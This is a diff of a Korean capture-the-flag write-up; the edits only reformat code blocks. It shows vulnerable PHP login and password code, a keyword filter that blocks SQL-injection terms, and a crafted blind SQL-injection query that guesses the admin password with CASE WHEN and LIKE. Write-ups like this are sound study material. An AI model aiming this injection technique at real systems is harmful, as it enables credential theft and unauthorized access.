@@ -36,23 +36,23 @@ rank 메뉴에 진입했을 때의 URL이 `http://chall.pwn-with.me/?page=rank`�
 
 먼저 주목해야 할 것은 info페이지의 19 ~ 35번 라인이다.
 
-```PHP
+```php
 <?PHP
-	IF($_POST){
-	   IF($_SESSION[ID] == 'ADMIN') EXIT();
-     IF($_POST[PW] == ""){
-				ECHO "<SCRIPT>ALERT('INPUT YOUR PASSWORD.');HISTORY.GO(-1);</SCRIPT>";
-			  EXIT();
-     }
-		 IF(STRLEN($_POST[PW]) > 32){
-		    ECHO "<SCRIPT>ALERT('CAN'T CREATE PASSWORD BIGGER THAN 32 BYTES.');HISTORY.GO(-1);</SCRIPT>";
-				EXIT();
-		 }
-		 $_POST[PW] = ADDSLASHES($_POST[PW]);
-		 $SQL = "UPDATE MEMBER SET PW = '$_POST[PW]' WHERE ID = '$_SESSION[ID]'";
-		 $Q = @MYSQL_QUERY($SQL);
-		 ECHO "<SCRIPT>ALERT('PW CHANGED.');LOCATION.HREF='?PAGE=INFO';</SCRIPT>";
-	}
+  IF($_POST){
+    IF($_SESSION[ID] == 'ADMIN') EXIT();
+    IF($_POST[PW] == ""){
+      ECHO "<SCRIPT>ALERT('INPUT YOUR PASSWORD.');HISTORY.GO(-1);</SCRIPT>";
+      EXIT();
+    }
+    IF(STRLEN($_POST[PW]) > 32){
+      ECHO "<SCRIPT>ALERT('CAN'T CREATE PASSWORD BIGGER THAN 32 BYTES.');HISTORY.GO(-1);</SCRIPT>";
+      EXIT();
+    }
+    $_POST[PW] = ADDSLASHES($_POST[PW]);
+    $SQL = "UPDATE MEMBER SET PW = '$_POST[PW]' WHERE ID = '$_SESSION[ID]'";
+    $Q = @MYSQL_QUERY($SQL);
+    ECHO "<SCRIPT>ALERT('PW CHANGED.');LOCATION.HREF='?PAGE=INFO';</SCRIPT>";
+  }
 ?>
 ```
 
@@ -60,7 +60,7 @@ info 페이지는 사용자의 비멀번호를 변경할 수 있는 페이지인
 
 다음으로 login 페이지의 12 ~ 35번 라인에서 공격 방식에 대한 힌트를 찾을 수 있었다.
 
-```PHP
+```php
 <?PHP
 	IF($_POST){
 		IF($_SESSION[ID]){
@@ -90,7 +90,7 @@ info 페이지는 사용자의 비멀번호를 변경할 수 있는 페이지인
 
 이제 index 페이지의 75 ~ 80번 라인을 보면,
 
-```PHP
+```php
 <?PHP
 	IF(PREG_MATCH("/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|>|<|,|\*|!|\.\./",IMPLODE($_GET))) EXIT("DETECTED");
 	IF(PREG_MATCH("/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|>|<|,|\*|!|\.\./",IMPLODE($_POST))) EXIT("DETECTED");
@@ -112,7 +112,7 @@ base64, select 등의 많은 구문을 입력에서 걸러내고 있음을 알 �
 
 이를 login의 id에 넣으면 다음과 같은 SQL Query가 완성된다.
 
-```SQL
+```sql
 SELECT * FROM MEMBER WHERE ID = 'fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a
 ```
 
